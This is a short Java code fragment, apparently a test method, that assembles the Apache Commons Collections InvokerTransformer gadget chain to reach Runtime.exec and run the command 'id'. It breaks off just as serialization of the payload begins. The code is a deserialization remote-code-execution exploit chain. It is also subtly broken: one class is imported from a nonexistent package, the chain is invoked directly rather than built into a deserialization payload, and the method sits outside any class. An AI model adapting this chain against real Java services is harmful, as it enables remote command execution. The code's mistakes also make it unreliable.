import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.chaining.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public void testArbitraryRemoteCodeExecution() throws Exception {
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"id"})
    };

    ChainedTransformer transformerChain = new ChainedTransformer(transformers);

    Map<String, String> innerMap = new HashMap<>();
    innerMap.put("key", "value");

    Map<String, Object> outerMap = new HashMap<>();
    outerMap.put("data", transformerChain.transform(innerMap));

    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);